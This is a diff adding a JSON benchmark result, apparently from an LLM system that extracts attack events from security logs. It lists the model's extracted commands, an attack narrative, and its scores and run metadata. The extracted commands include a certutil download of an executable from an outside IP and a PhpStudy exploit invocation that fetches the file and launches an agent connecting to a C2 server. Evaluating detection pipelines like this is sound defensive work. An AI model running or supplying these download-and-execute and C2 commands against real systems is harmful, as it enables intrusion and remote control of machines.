@@ -1,0 +1,60 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "python PhpStudyExp2.py http://121.36.30.176/ \\\"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Discovery"
+      }
+    ],
+    "narrative": "The attack begins with initial access via exploitation of vulnerabilities in PostgreSQL services using tools like pgAdmin4 and Python scripts. The attackers then perform lateral movement using remote desktop protocol (RDP) and execute commands to gain further control over the network. They escalate privileges through registry edits and service configurations. Defense evasion techniques include disabling Windows Defender and altering system files. Credential access is obtained by stealing accounts and modifying trusted directories. Finally, they establish persistence via scheduled tasks and backdoor scripts.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 19350,
+      "completion_tokens": 8927,
+      "total_tokens": 28277,
+      "wall_clock_s": 167.082,
+      "parse_retries": 3
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 1.0,
+      "recall": 0.2857142857142857,
+      "f1": 0.4444444444444445,
+      "tp": 2,
+      "fp": 0,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 2,
+      "fn": 6,
+      "recall_partial": 0.08333333333333333
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 19350,
+      "completion_tokens": 8927,
+      "total_tokens": 28277,
+      "wall_clock_s": 167.082,
+      "parse_retries": 3
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
